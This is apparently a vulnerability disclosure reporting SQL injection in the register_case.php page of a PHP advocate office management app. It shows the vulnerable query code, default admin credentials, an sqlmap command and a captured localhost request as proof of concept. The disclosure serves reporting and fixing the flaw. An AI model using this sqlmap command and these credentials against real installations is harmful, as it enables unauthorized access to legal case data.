# Kortex Lite Advocate Office Manage System

### SQL Injection on `/control/register_case.php`

### Vendor Homepage:

```
https://www.sourcecodester.com/php/17280/advocate-office-management-system-free-download.html
```

### Version:

```
v1.0
```

### Tested on:

```
PHP, Apache, MySQL
```

### Credentials:

```
http://127.0.0.1/kortex_lite/control/login.php
mayuri.infospace@gmail.com
admin
```

### Affected Page:

```
/control/register_case.php
```

In this scenario, the value of user input of the text field is directly concatenated into an SQL query without undergoing any form of filtering or utilizing prepared statements, causing the application vulnerable to SQL injection attack

```php
182:   if(isset($_POST['register'])){   

184:    $title = $_POST['title'];
185:    $case_no = $_POST['case_no'];
186:    $client_name = $_POST['client_name'];
187:    $court = $_POST['court'];
188:    $case_type = $_POST['case_type'];
189:    $case_stage= $_POST['case_stage'];
190:    $legel_acts = $_POST['legel_acts'];
191:    $description = $_POST['description'];

193:    $filling_date = $_POST['filling_date'];

195:    $hearing_date = $_POST['hearing_date'];
196:    $opposite_lawyer= $_POST['opposite_lawyer'];
197:    $total_fees= $_POST['total_fees'];
198:    $unpaid = $_POST['unpaid'];
   
205:    $case_sql = "INSERT INTO case_register(title,case_no,client_name,court,case_type,case_stage,legel_acts,description,filling_date,hearing_date,opposite_lawyer, total_fees,unpaid) VALUES('$title','$case_no','$client_name','$court','$case_type','$case_stage','$legel_acts','$description','$filling_date','$hearing_date','$opposite_lawyer','$total_fees','$unpaid')";
    
```

### Proof of Concept:

Payload:

```jsx
sqlmap -r request.txt --current-user --batch --dbms mysql
```

Burp Request:

```jsx
POST /kortex_lite/control/register_case.php HTTP/1.1
Host: localhost
Content-Length: 1439
Cache-Control: max-age=0
sec-ch-ua: "Not(A:Brand";v="24", "Chromium";v="122"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQSvesIPrMkAotcYM
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/kortex_lite/control/register_case.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ihtlup31vclhigou4q6if7fl1u
Connection: close

------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="title"

123
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="case_no"

123
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="client_name"

1
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="court"

1
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="case_type"

1
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="case_stage"

1
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="legel_acts"

1
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="description"

123
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="filling_date"

24/04/09
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="hearing_date"

24/04/09
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="opposite_lawyer"

123
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="total_fees"

123
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="unpaid"

0123
------WebKitFormBoundaryQSvesIPrMkAotcYM
Content-Disposition: form-data; name="register"

Submit
------WebKitFormBoundaryQSvesIPrMkAotcYM--

```
### Screenshot
![image](https://github.com/zyairelai/CVE-submissions/assets/49854907/dc8796fb-4902-4275-8cd3-92f3cf167b8d)
![image](https://github.com/zyairelai/CVE-submissions/assets/49854907/c4942cf8-2c38-4b4b-8020-d9064b913993)

